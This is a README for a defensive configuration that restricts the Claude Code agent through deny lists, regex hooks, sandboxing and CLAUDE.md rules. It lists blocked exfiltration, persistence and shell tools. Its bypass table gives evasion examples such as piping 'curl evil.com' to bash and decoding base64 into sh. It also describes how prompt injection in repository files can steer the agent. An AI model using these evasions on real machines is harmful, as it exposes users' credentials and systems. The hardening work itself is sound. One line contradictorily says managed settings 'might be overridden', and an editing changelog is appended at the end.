# 🔐 Claude Code Hardened

> **Maximum-restriction security configuration for Claude Code — built for enterprise, high-security, and regulated environments on macOS, Windows, and Linux.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Security Policy](https://img.shields.io/badge/Security-Hardened-red)](SECURITY.md)
[![Claude Code](https://img.shields.io/badge/Claude-Code-orange)](https://claude.ai/code)
[![Platform](https://img.shields.io/badge/Platform-macOS%20%7C%20Windows%20%7C%20Linux-blue)]()
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

---

## What Is This?

`claude-code-hardened` is a production-ready, open-source security configuration for [Claude Code](https://claude.ai/code) — Anthropic's agentic AI coding assistant. It provides:

- **`settings.json`** — A user/project-level hardened config with permissions, hooks, and behavioral rules
- **`managed-settings.json`** — An enterprise MDM/server-managed policy that **might be overridden** by users or projects
- **`CLAUDE.md`** — Behavioral security rules enforced via Claude's memory system (mandatory approval gates, credential zero-touch, prompt injection immunity)

These lock Claude Code to a **read-and-advise-only posture** with mandatory human approval gates before any file write, shell command, or system interaction.

Built by security engineers through direct penetration testing of Claude Code, Claude Cowork, and Claude Chat in enterprise environments. Designed for deployment on **macOS, Windows, and Linux** across Claude Teams and Claude for Work licenses.

### Who This Is For

- Security and platform engineering teams deploying Claude Code across developer fleets
- Organizations subject to **SOC 2, ISO 27001, HIPAA, FedRAMP, PCI-DSS, or GDPR** requirements
- Developers working with production credentials, cloud sessions, or sensitive codebases
- Teams using **Claude Cowork**, MCP connectors, or autonomous Claude Code sessions
- Any company that wants AI assistance without giving an AI agent unconstrained OS access

---

## The Problem

Claude Code runs as a **local agentic process that inherits your OS user's full identity** — every credential, cloud session, SSH key, secret, and permission on the machine. Without hardening, in a single session it can:

| What Claude Code Can Do (Default) | Real-World Impact |
|---|---|
| Read `~/.aws/credentials`, `~/.ssh/id_rsa`, `.env` | Full cloud account or infrastructure compromise |
| Execute `curl` or `wget` to external endpoints | Silent exfiltration of source code and credentials |
| Run `pip install` or `npm install` | Malicious package execution at install time |
| Write to `~/.zshrc`, LaunchAgents, or Startup folders | Persistent backdoor surviving session termination |
| Execute `aws`, `az`, `kubectl` with your active sessions | Complete cloud tenant compromise |
| Be prompt-injected via a README or code comment | Attacker-controlled execution under your identity |
| On Windows: invoke `powershell`, `certutil`, `bitsadmin` | LOLBin-based exfiltration bypassing AV/EDR |
| On Linux: read `/proc/*/environ`, write to systemd | Credential harvesting and persistent system-level execution |
| Bypass `Read()` denies via `cat .env` in Bash | Permission deny rules only apply to Claude's built-in file tools, not Bash subprocesses |

**One malicious comment in a dependency's README is enough.** This configuration is the blast-radius reduction layer between Claude Code and your infrastructure.

---

## Defense-in-Depth Architecture

This configuration layers **five independent defenses** because no single mechanism is sufficient:

### Layer 1: Permission Deny Rules
> **Blocks tool-level access (Read/Edit/Write/Bash/WebFetch)**
>
> ⚠️ *Limitation: Bash prefix-match only; `Read()` denies don't prevent `cat`/`head`/`tail` reading the same files via Bash*

### Layer 2: PreToolUse Hooks
> **Regex scans the ENTIRE Bash command string, catching:**
> - Forbidden commands after `|` `&&` `;` `` ` `` `$()`
> - `cat`/`head`/`tail` targeting `.env`, `.pem`, `.key`, `id_rsa`, etc.
> - Pipe-to-shell (`curl ... | bash`)
> - Subshell execution (`sh -c`, `bash -c`, `eval`, `exec`, `source`)
> - Encoding evasion (`base64`, `xxd`, `openssl`)

### Layer 3: Sandbox Settings *(managed-settings.json only)*
> **OS-level filesystem and network isolation:**
> - `denyRead` on credential directories
> - `denyWrite` on system directories
> - Zero outbound network (`allowedDomains: []`)

### Layer 4: MCP & Policy Lockdown *(managed-settings.json only)*
> - `allowManagedPermissionRulesOnly: true`
> - `allowManagedHooksOnly: true`
> - `allowManagedMcpServersOnly: true`
> - `disableBypassPermissionsMode: "disable"`
>
> Users cannot add their own allow rules, hooks, or MCP servers to circumvent enterprise policy.

### Layer 5: CLAUDE.md Behavioral Rules
> **Soft controls enforced via Claude's instruction following:**
> - Mandatory human approval before any write/execute
> - Credential zero-touch policy
> - Prompt injection detection and reporting
> - Scope lock to project directory
>
> ⚠️ *These are behavioral, not hard controls — defense in depth only, not primary enforcement*

---

## Repository Structure

| File | Purpose |
|---|---|
| `README.md` | This file |
| `settings.json` | User/project-level hardened config (permissions + hooks + env) |
| `managed-settings.json` | Enterprise MDM / server-managed policy (permissions + hooks + sandbox + MCP lockdown) |
| `CLAUDE.md` | Behavioral security rules (approval gates, credential policy, prompt injection immunity) |
| `CONTRIBUTING.md` | Contribution guidelines |
| `SECURITY.md` | Responsible disclosure policy |
| `CHANGELOG.md` | Version history |
| `examples/python-project.json` | Minimal allow-list for Python projects |
| `examples/node-project.json` | Minimal allow-list for Node.js/TS projects |
| `examples/readonly-audit.json` | Zero-write audit/security review mode |


### File Purposes & Key Differences

| File | Hard Controls | Bypass-Proof | User Can Override | Where It Goes |
|---|---|---|---|---|
| `managed-settings.json` | ✅ Permissions, hooks, sandbox, MCP lockdown | ✅ OS-level enforcement | ❌ Cannot override | MDM path or Claude.ai Admin Console |
| `settings.json` | ✅ Permissions, hooks | ⚠️ No sandbox/MCP lockdown | ⚠️ User can add own rules | `~/.claude/settings.json` or `.claude/settings.json` |
| `CLAUDE.md` | ❌ Behavioral only | ❌ Soft control | ⚠️ Project-level can shadow | `~/.claude/CLAUDE.md` or project root |

---

## Quick Start

### Option 1 — User-Global (all Claude Code sessions for your OS user)

**macOS / Linux:**
```bash
# Install settings.json
mkdir -p ~/.claude
cp ~/.claude/settings.json ~/.claude/settings.json.bak 2>/dev/null || true
curl -o ~/.claude/settings.json \
  https://raw.githubusercontent.com/nullze/claude-code-hardened/main/settings.json

# Install CLAUDE.md behavioral rules
curl -o ~/.claude/CLAUDE.md \
  https://raw.githubusercontent.com/nullze/claude-code-hardened/main/CLAUDE.md
```

**Windows (PowerShell):**
```powershell
# Install settings.json
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\.claude"
Copy-Item "$env:USERPROFILE\.claude\settings.json" `
  "$env:USERPROFILE\.claude\settings.json.bak" -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/nullze/claude-code-hardened/main/settings.json" `
  -OutFile "$env:USERPROFILE\.claude\settings.json"

# Install CLAUDE.md behavioral rules
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/nullze/claude-code-hardened/main/CLAUDE.md" `
  -OutFile "$env:USERPROFILE\.claude\CLAUDE.md"
```

### Option 2 — Per-Project (applies only within a specific repository)

```bash
# Install project-level settings
mkdir -p .claude
curl -o .claude/settings.json \
  https://raw.githubusercontent.com/nullze/claude-code-hardened/main/settings.json

# Install project-level behavioral rules
curl -o CLAUDE.md \
  https://raw.githubusercontent.com/nullze/claude-code-hardened/main/CLAUDE.md
```

> **Commit both `.claude/settings.json` and `CLAUDE.md` to your repository.** This ensures every developer using Claude Code in the project inherits the same security posture automatically, without individual configuration. Note: `CLAUDE.md` goes in the **project root**, not inside `.claude/`.

### Option 3 — Enterprise MDM Deployment (non-overridable)

Deploy `managed-settings.json` to the managed settings path on each platform. Settings deployed here **cannot be overridden** by user or project configuration.

#### macOS (Jamf / Mosyle / Intune)
```bash
# Deploy managed settings
sudo mkdir -p "/Library/Application Support/ClaudeCode"
sudo cp managed-settings.json "/Library/Application Support/ClaudeCode/managed-settings.json"
sudo chown root:wheel "/Library/Application Support/ClaudeCode/managed-settings.json"
sudo chmod 444 "/Library/Application Support/ClaudeCode/managed-settings.json"

# Deploy global behavioral rules
sudo mkdir -p /etc/claude
sudo cp CLAUDE.md /etc/claude/CLAUDE.md
sudo chown root:wheel /etc/claude/CLAUDE.md
sudo chmod 444 /etc/claude/CLAUDE.md
```

#### Windows (Intune / GPO)
```powershell
# Deploy managed settings (run as Administrator)
# Option A: File-based
New-Item -ItemType Directory -Force -Path "C:\ProgramData\ClaudeCode"
Copy-Item managed-settings.json "C:\ProgramData\ClaudeCode\managed-settings.json"
$path = "C:\ProgramData\ClaudeCode\managed-settings.json"
icacls $path /inheritance:r /grant:r "SYSTEM:F" /grant:r "Administrators:R"

# Option B: Registry (HKLM) — see Anthropic docs for registry-based managed settings
```

#### Linux (Ansible / Chef / Puppet)
```bash
# Deploy managed settings
sudo mkdir -p /etc/claude-code
sudo cp managed-settings.json /etc/claude-code/managed-settings.json
sudo chown root:root /etc/claude-code/managed-settings.json
sudo chmod 444 /etc/claude-code/managed-settings.json
```

#### Claude.ai Admin Console (Server-Managed — no MDM required)
For organizations using Claude for Work, you can upload `managed-settings.json` directly through the web GUI:

1. Go to **Claude.ai** → **Admin Settings** → **Claude Code** → **Managed Settings**
2. Click **Upload settings.json**
3. Paste or upload the contents of `managed-settings.json`
4. Review for schema validation — if you see "Errors detected in schema," see [Troubleshooting](#troubleshooting)
5. Click **Update**

Server-managed settings are delivered to all organization members automatically, without MDM infrastructure.

> **Tip:** Also deploy `CLAUDE.md` to each developer's `~/.claude/CLAUDE.md` via MDM or onboarding scripts. Behavioral rules in `CLAUDE.md` complement the hard controls in managed settings.

---

## What This Configuration Blocks

### Credential & Secret Paths (all platforms)

| Platform | Paths Protected |
|---|---|
| **macOS** | `~/.ssh`, `~/.aws`, `~/.azure`, `~/.config/gcloud`, `~/.kube`, `~/.gnupg`, `~/Library/Keychains`, 1Password, Bitwarden |
| **Windows** | `AppData/Roaming/Microsoft/Credentials`, `AppData/Local/Microsoft/Credentials`, `Windows/System32/config` (SAM hive), GitHub CLI, 1Password, Bitwarden, PowerShell profiles |
| **Linux** | `/home/*/.ssh`, `/home/*/.aws`, `/home/*/.kube`, `/home/*/.gnupg`, `/home/*/.local/share/keyrings`, `/root/*`, `/proc/*/environ`, `/proc/*/cmdline` |
| **Cross-platform** | All `.env`, `.env.*`, `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.jks`, `*.keystore`, `*.cer`, `*.crt`, `id_rsa*`, `id_ed25519*`, `id_ecdsa*`, `terraform.tfstate`, `terraform.tfvars`, `kubeconfig*`, `credentials.json`, `service-account*.json`, `*.vault`, `*.rdp`, `*.ppk` |

### Dangerous Commands (all platforms)

| Category | Blocked Commands |
|---|---|
| **Network** | `curl`, `wget`, `nc`, `ncat`, `socat`, `ssh`, `scp`, `rsync`, `sftp`, `ftp`, `telnet`, `nmap`, `tcpdump` |
| **Cloud CLIs** | `aws`, `az`, `gcloud`, `kubectl`, `helm`, `eksctl`, `terraform`, `vault`, `consul`, `nomad`, `packer` |
| **Containers** | `docker`, `podman`, `containerd`, `nerdctl`, `lima`, `colima`, `minikube`, `kind`, `k3d` |
| **Package Managers** | `pip install`, `npm install`, `yarn add`, `pnpm`, `bun`, `brew`, `gem`, `cargo`, `go get`, `go install`, `composer`, `apt`, `yum`, `dnf`, `apk`, `pacman`, `zypper`, `snap`, `flatpak`, `dpkg`, `rpm`, `winget`, `choco`, `scoop` |
| **Privilege Escalation** | `sudo`, `su`, `doas`, `pkexec`, `runas`, `chmod`, `chown`, `chgrp`, `icacls`, `takeown` |
| **Persistence** | `crontab`, `launchctl`, `systemctl`, `schtasks`, `sc.exe`, `update-rc.d`, `at`, `batch`, `systemd-run`, `pm2`, `supervisorctl` |
| **Windows LOLBins** | `powershell`, `cmd.exe`, `wscript`, `cscript`, `mshta`, `rundll32`, `regsvr32`, `msiexec`, `certutil`, `bitsadmin`, `wmic`, `reg.exe`, `regedit`, `netsh`, `bcdedit`, `winrm` |
| **Linux Capabilities** | `nsenter`, `unshare`, `capsh`, `setcap`, `getcap`, `chattr`, `setfacl`, `strace`, `ltrace`, `auditctl` |
| **macOS System** | `security`, `osascript`, `defaults`, `screencapture`, `diskutil`, `codesign`, `hdiutil`, `spctl`, `xattr`, `plutil`, `pbcopy`, `pbpaste` |
| **Environment Exfil** | `env`, `printenv`, `export`, `set`, `history` |
| **Password Managers** | `op` (1Password CLI), `bw` (Bitwarden), `rbw`, `lpass` (LastPass), `pass` |
| **Registry** | `reg.exe`, `regedit`, `wmic` — zero-touch on all registry operations |
| **Debugging** | `gdb`, `lldb`, `dtrace`, `dtruss`, `ktrace`, `strace`, `ltrace`, `perf` |
| **Inline Execution** | `python -c`, `python3 -c`, `node -e`, `ruby -e`, `perl -e`, `php -r` |
| **Bypass / Evasion** | `sh -c`, `bash -c`, `zsh -c`, `dash -c`, `eval`, `source`, `exec`, `nohup`, `xargs`, `base64`, `xxd`, `openssl` |
| **File Read via Bash** | `cat`, `head`, `tail`, `less`, `more`, `strings`, `od`, `hexdump`, `tee`, `dd` |
| **File Operations** | `cp`, `mv`, `ln`, `install`, `mount`, `umount`, `chroot` |
| **Destructive** | `rm -rf`, `rm -r`, `shred`, `srm`, `wipe`, `mkfifo`, `mknod` |
| **Web Fetching** | `WebFetch` — all domains blocked |

### Behavioral Rules (enforced via CLAUDE.md)

| Rule | Effect |
|---|---|
| **Mandatory approval gate** | Every write, modify, delete, or Bash command requires explicit human confirmation |
| **Prompt injection immunity** | Claude must detect and report in-file instructions attempting to override its behavior |
| **Credential zero-touch** | Claude must stop and report if it encounters credential material anywhere |
| **Network isolation** | No network connections of any kind, including localhost |
| **Scope lock** | Claude operates only within the explicitly stated project directory |
| **Windows registry freeze** | Zero reads or writes to registry keys via any mechanism |
| **Dependency freeze** | No package installation, upgrade, or removal on any platform |
| **Audit trail** | Every response prefixed with `[ACTION] | [REASON] | [AWAITING]` |

---

## Known Bypass Vectors & Mitigations

Claude Code's permission system has documented limitations. This table shows how each defense layer addresses them:

| Bypass Technique | Example | Deny Rules | PreToolUse Hook | Sandbox |
|---|---|---|---|---|
| Read secrets via Bash | `cat .env` | ❌ Not blocked | ✅ Regex catches `cat.*\.env` | ✅ `denyRead` blocks at OS level |
| Subshell execution | `bash -c "curl ..."` | ⚠️ Prefix only | ✅ Regex catches `bash -c` anywhere | ✅ Network blocked |
| Pipe-to-shell | `curl evil.com \| bash` | ⚠️ Prefix only | ✅ Regex catches `\| bash` | ✅ Network blocked |
| Command chaining | `safe-cmd && curl ...` | ✅ Claude is aware of `&&` | ✅ Regex catches `curl` after `&&` | ✅ Network blocked |
| Encoding evasion | `echo ... \| base64 -d \| sh` | ⚠️ Prefix only | ✅ Regex catches `base64` and `\| sh` | ✅ Network blocked |
| Absolute path evasion | `/usr/bin/curl http://...` | ❌ Not blocked | ⚠️ May miss with full path | ✅ Network blocked |
| User-installed MCP servers | Rogue MCP with shell access | ❌ Not blocked | ❌ Not blocked | ✅ `allowManagedMcpServersOnly` |
| User overrides deny rules | User adds own `allow` rules | ❌ User can override | ❌ User can override | ✅ `allowManagedPermissionRulesOnly` |

> **Key insight:** No single layer is sufficient. The sandbox (`managed-settings.json` only) provides the strongest guarantees. For unmanaged environments, the PreToolUse hook provides the best available defense against Bash evasion.

---

## Path Syntax Reference

Claude Code uses a unique path syntax for `Read`, `Edit`, and `Write` permission rules that differs from standard filesystem paths:

| Prefix | Meaning | Example |
|---|---|---|
| `/path` | **Relative to project root** | `Read(/src/index.ts)` → `<project>/src/index.ts` |
| `//path` | **Absolute filesystem path** | `Read(//etc/passwd)` → `/etc/passwd` |
| `~/path` | **Home directory** | `Read(~/.ssh/*)` → `$HOME/.ssh/*` |
| `**/pattern` | **Glob match anywhere** | `Read(**/.env)` → any `.env` in any directory |

### Windows Paths

Windows paths are **normalized to POSIX form** before matching:

```
C:\Users\alice  →  /c/Users/alice
```

Therefore, use lowercase drive letter with no colon:

```
❌  Read(C:/Users/*/.ssh/*)        ← Won't match at runtime
❌  Read(//C:/Users/*/.ssh/*)      ← Wrong: colon in POSIX path
✅  Read(//c/Users/*/.ssh/*)       ← Correct
```

### Parentheses in Paths

Parentheses in paths (like `Program Files (x86)`) break the permission parser because `(` is the tool specifier delimiter:

```
❌  Edit(//c/Program Files (x86)/*)  ← Parser sees (x86) as end of specifier
✅  Edit(//c/Program Files*/**)      ← Glob matches both directories
```

### Bash Rules

Bash rules use **prefix matching** only — they match the start of the command string. Claude Code is aware of shell operators (`&&`, `|`, `;`), so `Bash(safe-cmd *)` won't match `safe-cmd && evil-cmd`. However, prefix matching does **not** catch forbidden commands buried inside pipes, subshells, or variable expansion. Use PreToolUse hooks for full command string inspection.

### WebFetch Rules

WebFetch uses `domain:` specifiers, not glob paths:

```
❌  "WebFetch(*)"                   ← Invalid syntax
✅  "WebFetch"                      ← Blocks all web fetching
✅  "WebFetch(domain:example.com)"  ← Blocks specific domain
```

---

## Example Configurations

The `examples/` directory contains minimal allow-list configurations for common project types. These extend the base deny-list with only the permissions required for each use case:

| File | Use Case |
|---|---|
| `examples/python-project.json` | Python projects with pytest, ruff, mypy, bandit |
| `examples/node-project.json` | Node.js/TypeScript projects with pre-installed npm scripts |
| `examples/readonly-audit.json` | Security audits — zero writes, zero execution, structured findings output |

Copy the relevant example to `.claude/settings.json` in your project directory.

---

## Threat Model

### In Scope — Threats This Configuration Reduces

**Prompt Injection via Codebase**
An attacker embeds malicious instructions in a README, docstring, log, test fixture, or CI config. Claude reads the file during a legitimate task and follows embedded instructions.
- *Mitigated by:* Network, credential, and persistence blocks stop the most dangerous outcomes. The `CLAUDE.md` rules instruct Claude to detect and report embedded instructions. The PreToolUse hook blocks dangerous commands regardless of how they were triggered.

**Credential Harvesting**
Claude reads `~/.aws/credentials`, `.env`, `~/.ssh/id_rsa`, Windows Credential Manager, or similar files.
- *Mitigated by:* All credential paths are explicitly denied at the permission level. PreToolUse hook blocks `cat`/`head`/`tail` targeting sensitive files. Sandbox `denyRead` provides OS-level enforcement (managed settings only).

**Credential Harvesting via Bash**
Claude bypasses `Read()` deny rules by using `cat .env`, `head ~/.ssh/id_rsa`, or `grep password config.yml` in Bash.
- *Mitigated by:* `cat`, `head`, `tail`, `less`, `more`, `strings` are in the deny list. PreToolUse hook regex-scans the full command for sensitive file patterns. Sandbox `denyRead` blocks at OS level (managed settings only).

**Supply Chain Tampering**
Claude installs a malicious package or modifies a CI/CD pipeline based on attacker-influenced content.
- *Mitigated by:* All package managers and CI/CD pipeline write paths are blocked.

**Cloud Session Hijacking**
Claude executes `aws`, `az`, or `kubectl` using the developer's active cloud sessions.
- *Mitigated by:* All cloud CLIs are denied at the permission level and caught by the PreToolUse hook.

**Windows LOLBin Abuse**
Claude is prompted to use `certutil`, `bitsadmin`, `mshta`, or PowerShell as download or execution proxies.
- *Mitigated by:* All identified Windows Living Off the Land Binaries are denied in prefix rules and caught by the PreToolUse hook.

**Persistence Installation**
Claude writes to shell profiles, LaunchAgents, Startup folders, systemd units, or scheduled tasks.
- *Mitigated by:* All persistence directories and scheduling commands are write-blocked.

**Linux Privilege / Capability Abuse**
Claude uses `nsenter`, `setcap`, or Linux namespace tools to escalate privileges or escape containers.
- *Mitigated by:* All Linux capability and namespace management commands are denied.

**Command Evasion via Subshells / Pipes / Encoding**
Claude constructs commands like `bash -c "curl ..."`, `echo ... | base64 -d | sh`, or `eval "$(encoded_payload)"`.
- *Mitigated by:* `sh -c`, `bash -c`, `eval`, `source`, `exec`, `base64`, `xxd` are in the prefix deny list. PreToolUse hook regex-scans the full command string for these patterns anywhere in the command, including after pipes and semicolons.

---

### Out of Scope — Residual Risk

| Risk | Recommendation |
|---|---|
| **CLAUDE.md bypass** | Behavioral rules are soft controls — Claude may not always follow them. The permission deny-list and hooks are the hard controls. Layer with endpoint DLP and terminal logging. |
| **Absolute path evasion** | `/usr/bin/curl` may bypass prefix-match deny rules. The PreToolUse hook catches most cases, but sandbox network isolation is the definitive control. |
| **Secrets inline in project files** | Deploy `gitleaks` or `trufflehog` as a pre-commit hook. Claude reads project source files that are in the allow list. |
| **Cowork GUI automation** | Cowork operates at the GUI layer, outside `settings.json` scope entirely. Apply separate controls; restrict to non-credentialed machines. |
| **MCP connector exfiltration** | Connected MCP servers (Gmail, Atlassian, etc.) are trusted exfiltration channels. Use `allowManagedMcpServersOnly` in managed settings, or disconnect MCP in Claude Code environments. |
| **New Claude Code features** | Review config against every Claude Code release. New tools are not automatically blocked. |
| **Glob pattern edge cases** | Validate all rules in a staging environment before fleet MDM rollout. |
| **WSL2 on Windows** | Windows Subsystem for Linux runs a separate Linux environment; apply Linux-specific rules inside WSL2 separately. |
| **SchemaStore sync lag** | The JSON schema at `json.schemastore.org/claude-code-settings.json` may lag behind Claude Code releases, causing false validation errors. |

---

## Troubleshooting

### "Errors detected in schema" in Claude.ai Admin Console

If you see this warning when uploading to the Web GUI:

| Symptom | Cause | Fix |
|---|---|---|
| Underlined Windows paths | `//C:/Users/...` (uppercase, colon) | Use `//c/Users/...` (lowercase, no colon) |
| Underlined `Program Files` paths | Parentheses in `(x86)` break parser | Use `Program Files*/**` glob |
| Underlined `WebFetch(*)` | Invalid specifier syntax | Use bare `WebFetch` (no parentheses) |
| Underlined `Bash(pass *)` | Ambiguous with `passwd` | Split into `Bash(pass show *)`, `Bash(pass edit *)`, etc. |
| `$schema` key rejected | Web GUI has its own validator | Remove `$schema` line |
| `"managed": true` rejected | Not a valid key — managed status comes from file location | Remove the key |
| `"rules"` key rejected | Not a valid settings.json key | Move content to `CLAUDE.md` file |
| `"enableTelemetry"` rejected | Not a valid key | Use `"env": {"CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1"}` |
| `"disableAutoUpdates"` rejected | Not a valid key | Use `"autoUpdaterStatus": "disabled"` |
| `"lockPermissions"` rejected | Not a valid key | Use `"allowManagedPermissionRulesOnly": true` (top-level) |

### PreToolUse hook not blocking commands

- Hooks require `jq` to be installed on the system (`brew install jq`, `apt install jq`, `choco install jq`)
- Test the hook manually: `echo '{"tool_input":{"command":"curl http://evil.com"}}' | bash -c '<hook_command>'`
- If the inline hook is too long for the Web GUI, save the script to a file and reference the path instead

### Sandbox not enforcing restrictions

- Sandbox must be enabled per-workstation (run `/sandbox` in Claude Code or set `autoAllowBashIfSandboxed`)
- Sandbox settings in `managed-settings.json` define the policy, but the sandbox runtime must be active
- On WSL2, sandbox requires additional setup — see [Claude Code Troubleshooting docs](https://code.claude.com/docs/en/troubleshooting)

---

## Compliance Alignment

| Framework | Relevant Controls |
|---|---|
| **SOC 2 Type II** | CC6.1 (Logical access), CC6.6 (Restrict production access), CC7.2 (System monitoring) |
| **ISO 27001:2022** | A.8.2 (Privileged access), A.8.15 (Logging), A.8.25 (Secure development lifecycle) |
| **NIST AI RMF** | GOVERN 1.1, MANAGE 2.2 (Risk treatment for AI systems) |
| **NIST SP 800-53** | AC-6 (Least privilege), AU-2 (Audit events), SI-3 (Malicious code protection) |
| **CIS Controls v8** | Control 3 (Data protection), Control 6 (Access control management), Control 16 (Application security) |
| **PCI-DSS v4.0** | Req. 7 (Restrict access to system components), Req. 10 (Log and monitor) |
| **HIPAA** | §164.312(a)(1) (Access control), §164.312(b) (Audit controls) |

---

## Recommended Companion Controls

This configuration is most effective as one layer in a defense-in-depth stack:

- **Pre-commit secret scanning:** [`gitleaks`](https://github.com/gitleaks/gitleaks), [`trufflehog`](https://github.com/trufflesecurity/trufflehog)
- **Endpoint DLP:** CrowdStrike, Zscaler, Microsoft Purview — alert on `curl`/`wget` to unapproved domains
- **Terminal session logging:** macOS Unified Logging, Windows Event Forwarding, auditd on Linux
- **SIEM integration:** Ingest Claude Code session logs for anomaly detection on unusual command proposals
- **Git commit signing:** GPG-signed commits ensure AI-generated changes are attributable
- **Dev containers:** Run Claude Code inside a Dev Container or Lima VM with no credential directory mounts
- **MCP OAuth scoping:** If MCP connectors are required, scope tokens to minimum necessary permissions (e.g., Gmail compose-only, no read)
- **Sandbox runtime:** Enable Claude Code's built-in sandbox for OS-level filesystem and network isolation

---

## Versioning & Maintenance

This repository tracks Claude Code releases. When Anthropic ships new features or tools, the configuration is reviewed and updated. **Watch this repository** for release notifications.

| Config Version | Claude Code Era | Platforms | Last Reviewed |
|---|---|---|---|
| v1.0.0 | Claude 4.x | macOS, Windows, Linux | 2025-03 |

> Pin your MDM deployment to a tagged release (`v1.0.0`) rather than `main` so your fleet doesn't receive untested configuration changes automatically.

---

## Contributing

Contributions are welcome. Priority areas:

- Missing tools, CLIs, or credential paths for any platform
- MDM deployment guides (Jamf, Intune, Mosyle, Ansible, GPO)
- Additional example configs for Java, Go, Rust, and other ecosystems
- CI/CD GitHub Action to validate the config against the SchemaStore schema on PRs
- WSL2-specific hardening guidance
- PreToolUse hook improvements (additional regex patterns, performance optimization)
- Sandbox configuration examples and testing

Please read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting. All changes are reviewed for security implications before merging. Report bypass vulnerabilities via [SECURITY.md](SECURITY.md) — not as public issues.

---

## License

MIT — see [LICENSE](LICENSE). Free for commercial and non-commercial use.

---

## Acknowledgments

Built by security engineers who identified these risks through direct security testing of Claude Code, Claude Cowork, and Claude Chat in enterprise environments with Claude Teams and Claude for Work licenses.

Special thanks to the Claude Code documentation team for the thorough [permissions](https://code.claude.com/docs/en/permissions), [settings](https://code.claude.com/docs/en/settings), [hooks](https://code.claude.com/docs/en/hooks), [sandboxing](https://code.claude.com/docs/en/sandboxing), and [server-managed settings](https://code.claude.com/docs/en/server-managed-settings) reference docs.

---

*Searching for: claude code security hardening | claude code enterprise policy | claude code settings.json restrict | harden claude ai | claude code prompt injection protection | claude code windows security | claude code linux hardening | claude code macos lockdown | claude code least privilege | anthropic claude code devsecops | claude code managed policy MDM | claude code teams license security configuration | ai agent security enterprise | llm agent hardening | claude code credential protection | claude code PreToolUse hooks security | claude code bash bypass prevention | claude code sandbox enterprise*

## Summary of README Changes

| # | Change | Why |
|---|---|---|
| 1 | **Added `CLAUDE.md` as a first-class file** throughout | Rules were moved out of the invalid `"rules"` JSON key into `CLAUDE.md` — the README now explains this file, its purpose, and where to install it |
| 2 | **Renamed `managed_settings.json` → `managed-settings.json`** | Matches Anthropic's actual filename convention with hyphens |
| 3 | **Fixed all MDM deployment paths** | `ClaudeCode/managed-settings.json` (macOS), `/etc/claude-code/managed-settings.json` (Linux), `ProgramData\ClaudeCode\managed-settings.json` (Windows) — matching actual docs |
| 4 | **Added Defense-in-Depth Architecture diagram** | Visual explanation of the 5 layers (permissions → hooks → sandbox → MCP lockdown → CLAUDE.md) |
| 5 | **Added Known Bypass Vectors table** | Honest documentation of what each layer catches and what it misses |
| 6 | **Added Path Syntax Reference section** | Documents `//` vs `/` vs `~/`, Windows POSIX normalization, parentheses issues, Bash prefix matching, WebFetch syntax |
| 7 | **Added Troubleshooting section** | Every schema validation error we encountered with Web GUI and how to fix it |
| 8 | **Added Claude.ai Admin Console deployment option** | Server-managed settings via Web GUI for orgs without MDM |
| 9 | **Updated commands/paths tables** | Added all new blocked commands (bypass evasion, file read via Bash, containers, etc.) |
| 10 | **Updated threat model** | Added Bash credential harvesting, command evasion, and MCP lockdown mitigations |
| 11 | **Updated residual risks** | Added absolute path evasion, CLAUDE.md soft control caveat, SchemaStore sync lag |
| 12 | **Added `CLAUDE.md` install steps** to Quick Start for all three options | Users need to install both files |
| 13 | **Added File Purposes & Key Differences table** | Clear comparison of what each file provides and its limitations |
